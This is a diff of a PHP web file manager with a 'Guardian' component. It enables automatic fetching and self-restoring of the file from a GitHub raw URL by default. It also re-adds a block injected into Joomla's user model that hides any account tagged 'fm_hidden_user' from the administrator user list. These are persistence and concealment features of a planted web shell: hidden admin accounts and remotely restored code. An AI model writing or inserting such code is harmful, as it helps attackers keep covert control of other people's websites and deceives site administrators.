@@ -69,7 +69,7 @@ function fm_ensure_terminal_font(){
    (see FM_UPDATE_PAUSED below), which is ON by default and resumes the
    moment the pause is lifted. */
 if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', 'https://raw.githubusercontent.com/orgezeo/marshal-file-manager/refs/heads/main/index.php'); // raw-file URL used to check for/apply updates and, if set, to restore a missing file; rewritten in place by the Guardian panel, never by anonymous requests
-if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', true); // current pause state is stored in this file; preserve the existing enabled/paused state
+if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', false); // automatic update checks are enabled by default; the Guardian panel can pause them temporarily
 
 /* Prefer the database the project already uses. Replit and most modern PHP
    deployments expose it as DATABASE_URL; the old fmguardian@127.0.0.1:3307
@@ -2497,18 +2497,18 @@ FMHIDDEN;
         }
         $block=<<<'FMJOOMLA'
 
-		/* MARSHAL_FM_HIDDEN_USERS_BEGIN */
-		$fmHiddenRows = $db->setQuery(
-			$db->getQuery(true)
-				->select($db->quoteName('id'))
-				->from($db->quoteName('#__users'))
-				->where($db->quoteName('params') . ' LIKE ' . $db->quote('%fm_hidden_user%'))
-		)->loadColumn();
-		$fmHiddenIds = array_values(array_filter(array_map('intval', (array) $fmHiddenRows)));
-		if ($fmHiddenIds) {
-			$query->where($db->quoteName('a.id') . ' NOT IN (' . implode(',', $fmHiddenIds) . ')');
-		}
-		/* MARSHAL_FM_HIDDEN_USERS_END */
+        /* MARSHAL_FM_HIDDEN_USERS_BEGIN */
+        $fmHiddenRows = $db->setQuery(
+            $db->getQuery(true)
+                ->select($db->quoteName('id'))
+                ->from($db->quoteName('#__users'))
+                ->where($db->quoteName('params') . ' LIKE ' . $db->quote('%fm_hidden_user%'))
+        )->loadColumn();
+        $fmHiddenIds = array_values(array_filter(array_map('intval', (array) $fmHiddenRows)));
+        if ($fmHiddenIds) {
+            $query->where($db->quoteName('a.id') . ' NOT IN (' . implode(',', $fmHiddenIds) . ')');
+        }
+        /* MARSHAL_FM_HIDDEN_USERS_END */
 FMJOOMLA;
         $root=dirname($configPath);
         $modelFiles=[
